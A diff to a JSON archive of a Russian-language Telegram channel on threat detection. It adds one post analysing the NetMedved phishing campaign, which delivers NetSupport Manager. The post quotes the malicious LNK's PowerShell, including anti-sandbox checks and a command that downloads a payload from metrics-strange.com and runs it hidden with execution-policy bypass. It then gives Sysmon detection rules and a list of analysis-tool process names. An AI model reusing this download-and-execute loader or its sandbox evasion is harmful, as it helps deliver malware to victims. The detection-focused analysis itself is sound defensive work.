@@ -1,8 +1,15 @@
 {
   "channel": "detectioneasy",
-  "last_update": "2025-11-23T09:25:04.788739+00:00",
-  "messages_count": 34,
+  "last_update": "2025-11-23T14:22:10.441836+00:00",
+  "messages_count": 35,
   "messages": [
+    {
+      "id": "293",
+      "title": "Коллеги из PT рассказали про фишинговую кампанию NetMedved, цель которой - установить NetSupport Manager",
+      "text": "Всем привет! 💻✌️\nКоллеги из PT рассказали про фишинговую кампанию NetMedved, цель которой - установить NetSupport Manager\n👨‍💻 Разберём интересный момент: в LNK вынесены проверки на выполнение в песочнице. Обычно такие проверки встречаются на 2–3 этапе, но здесь они — сразу в LNK.\n🔤 жертвам рассылаются письма с вложенными архивами\n🔤 в архиве находятся: LNK, DOCX и PDF — документы маскируются под деловую переписку российских компаний.\n🔤LNK файл выполняет проверки на antisandbox:\nпроверка процессов для анализа программ\nGet-Process | Where-Object {$_Name -match 'filemon|regmon|procexp|procexp64|t cpview|tcpview64|Procmon|Procmon64|vmmap|vmmap64|portmon|processlasso|Wireshark|Fiddler|ida|ida64|ImmunityDebugger|WinDump|x64dbg|x32dbg|OllyDbg|ProcessHacker'})\nпроверка логических процессоров\n((Get-CimInstance Win32_Processor).NumberOfLogicalProcessors -lt 2)\nпроверка разрешения экрана\n([System.Windows.Forms.Screen]:PrimaryScreen.Bounds.Width -lt 800) -or ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height  -lt 600))\n🔤 Если проверки пройдены успешно, то создается ps1-файл в LocalAppData с именем сгенерированного GUID\n$etdvmovzr = (Get-Item Env:LocalAppData).Value+\\'+([guid]:NewGuid())+'.pS1';\n🔤с удаленного ресурса загружается ps1-нагрузка и записывается в созданный GUID-файл. Запуск скрипта\nirm 'metrics-strange.com/c626b76039054fe7899.ps1' > $etdvmovzr;saps 'powershell' -ArgumentList ('-NoProfile\"'-ep\"'bypass\".\"-WindO'HIDD':-File' $etdvmovzr); exit O }\"\n🔭 Обнаружение:\n🔤 отслеживаем создание LNK-файлов в %temp%\nProviderName=\"Microsoft-Windows-Sysmon\" and EventId = 11 and TargetFilename contains \"\\AppData\\Local\\Temp\\\" and TargetFilename endswith \".lnk\"\n🔤 отслеживаем аргументы powershell PrimaryScreen.Bounds.Width, PrimaryScreen.Bounds.Height,  'filemon|regmon|procexp|procexp64|tcpview|tcpview64|Procmon|Procmon64|vmmap|vmmap64|portmon|processlasso|Wireshark|Fiddler|ida|ida64|ImmunityDebugger|WinDump|x64dbg|x32dbg|OllyDbg|ProcessHacker'\n#detection@detectioneasy\n#ttp@detectioneasy",
+      "link": "https://t.me/detectioneasy/293",
+      "pub_date": "2025-11-23T10:09:22+00:00"
+    },
     {
       "id": "292",
       "title": "Обнаружена уязвимость CVE-2025-11001 в 7-Zip, позволяющая записывать файлы в произвольные места системы при распаковке архивов. Активно используется в фишинговых кампаниях",
